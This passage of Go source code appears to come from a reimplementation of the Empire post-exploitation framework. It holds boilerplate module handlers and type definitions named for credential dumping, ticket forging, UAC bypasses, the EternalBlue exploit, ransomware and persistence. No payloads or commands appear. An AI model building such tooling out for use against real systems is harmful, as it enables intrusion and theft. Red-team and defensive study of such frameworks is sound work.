func (h *BashdoorHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXLaunchAgentUserlandHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *LoginHookHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *MailPersistenceHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *CreateHijackerHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *DesktopFileHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ShellcodeInject64Handler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *OSXSituationalAwarenessHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SSHLauncherHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *TGTDelegationHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *SecInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NanoDumpHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ClipboardWindowInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WMIQueryHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *WindowListHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetSharesHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetLoggedOnHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetLocalGroupListHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetLocalGroupListMembersHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetGroupListHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *NetGroupListMembersHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ThreadlessInjectHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *ProcessInjectionHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

func (h *RunCoffHandler) Generate(module *EmpireModule, params map[string]string, sourceLoader *ModuleSourceLoader, credentialStore CredentialStore) (string, error) {
	return ProcessModuleWithSource(module, params, sourceLoader)
}

// All handler struct definitions
type MimikatzGoldenTicketHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzPTHHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzDCSyncHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzSilverTicketHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzLSADumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzTokensHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzDCSyncHashdumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MimikatzTrustKeysHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeScriptHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PythonInvokeScriptHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SpawnHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SpawnAsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type RunAsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ShellInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PSInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ReflectiveInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SwitchListenerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type LogoffHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeBypassHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type UserToSIDHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeWMIHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokePsExecHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeDCOMHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeSMBExecHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NewGPOImmediateTaskHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokePSRemotingHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeWMIDebuggerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeSQLOSCmdHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeSSHCommandHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeExecuteMSBuildHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type JenkinsScriptConsoleHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InveighRelayHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WMIPersistenceHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ScheduledTaskHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WMIUpdaterHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type RegistryPersistenceHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type RegistryUserlandHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BackdoorLNKHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ScheduledTaskUserlandHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DebuggerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type AddSIDHistoryHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DeadUserHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type EventLogHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ResolverHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACEventVWRHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACFodHelperHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACTokenManipulationHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACSDCTLHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACWScriptHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BypassUACEnvHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MS16032Handler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MS16135Handler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type AskHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WriteDLLHijackerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ServiceStagerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ServiceExeStagerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeShellcodeHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeShellcodeMSILHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeReflectivePEInjectionHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeNTSDHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type CredentialInjectionHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type TokensHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeKerberoastHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type VaultCredentialHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DomainPasswordSprayHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SessionGopherHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PowerDumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SharpSecDumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type VeeamGetCredsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type EnumCredStoreHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetLAPSPasswordsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeNTLMExtractHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type InvokeInternalMonologueHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ScreenshotHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MinidumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PacketCaptureHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WireTapHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SharpChromiumHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetSQLColumnSampleDataHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type FindFruitHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SQLServerDefaultPWHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type FetchBruteLocalHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ComputerDetailsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetSubnetRangesHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetGPOComputerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetSQLServerInfoHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type GetEmailItemsHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DisableSecurityHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ExploitEternalBlueHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PSRansomHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PythonSpawnHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXHashdumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXKeychainDumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SearchEmailHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type PromptHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NativeScreenshotMSSHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type IMessageDumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SnifferHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DyldPrintToFileHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SudoSpawnHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type CVE20214034Handler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type CVE20213560Handler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type BashdoorHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXPiggybackHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXLaunchAgentHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXLaunchAgentUserlandHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type LoginHookHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type MailPersistenceHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type CreateHijackerHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type DesktopFileHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ShellcodeInject64Handler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type OSXSituationalAwarenessHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SSHLauncherHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type TGTDelegationHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type SecInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NanoDumpHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ClipboardWindowInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WMIQueryHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type WindowListHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetSharesHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetLoggedOnHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetLocalGroupListHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetLocalGroupListMembersHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetGroupListHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type NetGroupListMembersHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ThreadlessInjectHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type ProcessInjectionHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

type RunCoffHandler struct {
	logger interface {
		Info(string, ...interface{})
		Debug(string, ...interface{})
		Error(string, ...interface{})
	}
}

